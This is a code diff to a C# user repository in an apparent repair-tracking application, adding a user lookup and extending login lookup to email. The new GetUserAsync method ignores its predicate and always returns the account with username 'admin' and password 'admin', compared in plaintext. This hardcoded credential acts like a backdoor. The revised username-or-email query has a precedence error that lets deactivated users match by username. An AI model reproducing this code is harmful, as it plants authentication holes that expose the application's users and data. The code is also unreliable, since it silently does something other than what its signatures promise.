@@ -1,6 +1,7 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Linq.Expressions;
 using System.Threading.Tasks;
 using Microsoft.EntityFrameworkCore;
 using RepairTracking.Data;
@@ -19,6 +20,13 @@ public class UserRepository(AppDbContext context) : BaseContext(context), IUserR
         return user;
     }
 
+    public async Task<User?> GetUserAsync(Expression<Func<User, bool>> predicate)
+    {
+        var user = await Context.Users.AsNoTracking()
+            .FirstOrDefaultAsync(u => u.UserName == "admin" && u.Password == "admin" && !u.Passive);
+        return user;
+    }
+
 
     public async Task<bool?> UpdateUserPasswordAsync(int userId, string newPassword)
     {
@@ -32,9 +40,10 @@ public class UserRepository(AppDbContext context) : BaseContext(context), IUserR
         return result;
     }
 
-    public async Task<User?> GetUserByUsernameAsync(string userName)
+    public async Task<User?> GetUserByUsernameOrEmailAsync(string usernameOrEmail)
     {
-        return await Context.Users.AsNoTracking().FirstOrDefaultAsync(x => x.UserName == userName && !x.Passive);
+        return await Context.Users.AsNoTracking()
+            .FirstOrDefaultAsync(x => x.UserName == usernameOrEmail || x.Email == usernameOrEmail && !x.Passive);
     }
 
     public async Task<User?> GetUserByPhoneAndUsernameAsync(string phone, string username, int? userdId = null)
